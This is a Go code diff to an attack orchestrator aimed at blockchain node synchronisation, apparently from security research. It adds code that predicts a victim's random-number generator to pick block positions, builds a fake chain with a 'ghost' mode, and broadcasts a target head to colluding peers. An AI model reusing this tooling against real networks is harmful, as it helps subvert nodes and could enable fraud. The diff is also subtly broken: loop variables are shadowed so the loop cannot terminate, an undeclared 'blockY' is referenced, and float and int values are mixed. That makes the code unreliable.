@@ -57,6 +57,9 @@ type Orchestrator struct {
 	fraction float64
 	honestHashrate float64
 	ghostAttack bool
+	blockX int
+	blockY int
+	targetHead int
 }
 
 type OrchConfig struct {
@@ -137,7 +140,6 @@ func (o *Orchestrator) Start(cfg *OrchConfig) {
 		return
 	}
 
-	o.Tm = cfg.Tm
 	o.fraction = cfg.Fraction
 	o.honestHashrate = cfg.HonestHashrate
 
@@ -293,23 +295,6 @@ func (o *Orchestrator) leadAttack() {
 		return
 	}
 
-	<-o.syncCh
-	/*
-	o.attackPhase = utils.SyncPhase
-	fmt.Println("Started", o.attackPhase, "phase")
-	*/
-
-
-
-	// --- SYNC PHASE ---
-
-	err := o.send(o.peerset.masterPeer, msg.GetCwd)
-	if err != nil {
-		fmt.Println("Couldn't get current working directory of master peer")
-		o.errc <- err
-		return
-	}
-	
 	o.rand = mrand.New(mrand.NewSource(int64(o.seed)))
 
 	// Step forward the PRNG to account for calls to it during the prediction phase
@@ -325,41 +310,34 @@ func (o *Orchestrator) leadAttack() {
 		fmt.Println("")
 	}()
 
-	pyInterpreterBytes, err := exec.Command("which", "python").Output()
-	if err != nil {
-		py3InterpreterBytes, err2 := exec.Command("which", "python3").Output()
-		if err2 != nil {
-			fmt.Println("Couldn't find python interpreter")
-			o.errc <- fmt.Errorf("err1: %w, err2: %w", err, err2)
-			return
-		} else {
-			pyInterpreterBytes = py3InterpreterBytes
-		}
-	}
-	pyInterpreter := string(pyInterpreterBytes)
-	pyInterpreter = strings.Trim(pyInterpreter, "\r\n")
+	o.syncCh <- struct{}{}	// Announce PRNG has been initialised
 
-	optimizeScript, err := getOptimizeScriptPath()
+	<-o.syncCh				// Wait for blockX, blockY to be found
+	fmt.Println("Found x, y =", o.blockX, ",", blockY)
+	fmt.Println("Set target head: ", o.targetHead)
+
+	<-o.syncCh				// Wait for first syncOp of sync phase to start
+	/*
+	o.attackPhase = utils.SyncPhase
+	fmt.Println("Started", o.attackPhase, "phase")
+	*/
+
+
+
+	// --- SYNC PHASE ---
+
+	err := o.send(o.peerset.masterPeer, msg.GetCwd)
 	if err != nil {
-		fmt.Println("Couldn't get optimize script path")
+		fmt.Println("Couldn't get current working directory of master peer")
 		o.errc <- err
 		return
 	}
-	
-	outputFile := "strategy.txt"
-	cmd := exec.Command(pyInterpreter, optimizeScript, "--time", strconv.Itoa(o.Tm),
-						"--fraction", strconv.FormatFloat(o.fraction, 'f', -1, 64), "--export", outputFile)
-	err = cmd.Run()
-	if err != nil {
-		fmt.Println("Couldn't run optimization script")
-		o.errc <- err
-		return
-	}
-	
+
 	// TODO: Tune the PRNG
 
 	<-o.prngTuned
 
+	/*
 	// Now, account for next 11 honest batches
 	fmt.Println("Accounting for 11 repeated batches")
 	for i := 0; i < 2*11; i++ {
@@ -367,6 +345,7 @@ func (o *Orchestrator) leadAttack() {
 		o.prngSteps[100]++
 	}
 	fmt.Println("")
+	*/
 
 
 	//TODO: RE-ENABLE block below for non-testing
@@ -384,19 +363,20 @@ func (o *Orchestrator) leadAttack() {
 		buildchain.SetHashrateLimit(-1)
 	}
 	// We change bp only for testing purposes. Remove the line below later on.
-	bp := buildchain.BuildParametersForTesting(o.rand)
+	bp := buildchain.BuildParametersForTesting(o.blockX, o.blockY, o.targetHead)
 
 	buildchain.SetSeals(bp.SealsMap)
 	buildchain.SetTimestampDeltas(bp.TimestampDeltasMap)
 
+
 	errc := make(chan error)
 	results := make(chan types.Blocks)
 	go func() {
-		if o.ghostAttack {
-			<-o.syncCh							// Wait for ghost root to be set
-			fmt.Println("Ghost root set")
-		}
-		errc <- buildchain.BuildChain(utils.FakeChain, bp.NumBatches*utils.BatchSize + utils.MinFullyVerifiedBlocks,
+		// Wait for ghost root to be set and peer database to be copied to buildchain,
+		// before we start mining.
+		<-o.syncCh
+		<-o.syncCh
+		errc <- buildchain.BuildChain(utils.FakeChain, utils.BatchSize - o.blockX - 1 + utils.MinFullyVerifiedBlocks,
 									  false, 0, o.ghostAttack, false, results) 
 	}()
 
@@ -714,14 +694,58 @@ func (o *Orchestrator) handleMessages() {
 						return
 					}
 					fmt.Println("Peer's database copied into buildchain tool")
-
+					o.syncCh <- struct{}{}		// Notify database has been copied
 				}()
 			case msg.Cwd.Code:
 				mgethDir = string(message.Content)
 				buildchain.SetMgethDir(mgethDir)
 			case msg.GhostRoot.Code:
 				buildchain.SetGhostRoot(message.Content)
+				fmt.Println("Ghost root set")
 				go func() {o.syncCh <- struct{}{}}()
+			case msg.CurrentHead.Code:
+				go func() {
+					currentHead := int(binary.BigEndian.Uint64(message.Content))
+					n := math.Ceil(float64(currentHead+60)/192.0) + 1
+					<-o.syncCh		// Wait for PRNG initialisation
+					for i := 0; i < 2*n; i++ {
+						o.rand.Intn(100)
+					}
+					for i := 0; i < 2*7; i++ {		// Force C > 7
+						o.rand.Intn(100)
+					}
+					C := 7
+					x := 0
+					y := 0
+					for (y >= 170 || y-x <= 160) {
+						C++
+						x := o.rand.Intn(100)
+						y := 100 + o.rand.Intn(100)
+					}
+					o.blockX = x
+					o.blockY = y
+					o.targetHead = utils.BatchSize * (n-1) + x + 1
+					o.syncCh <- struct{}{}
+
+					content := make([]byte, 4)
+					binary.BigEndian.PutUint32(content, uint32(C))
+					err := sendAll(msg.SteppingBatches.SetContent(content))
+					if err != nil {
+						fmt.Println("Could not send number of stepping batches to peers")
+						o.errc <- err
+						o.close()
+						return
+					}
+					content = make([]byte, 8)
+					binary.BigEndian.PutUint64(content, uint64(o.targetHead))
+					err = sendAll(msg.TargetHead.SetContent(content))
+					if err != nil {
+						fmt.Println("Could not send target head to peers")
+						o.errc <- err
+						o.close()
+						return
+					}
+				}()
 
 
 			// Default policy: relay the message among peers if no particular action by the orch is needed
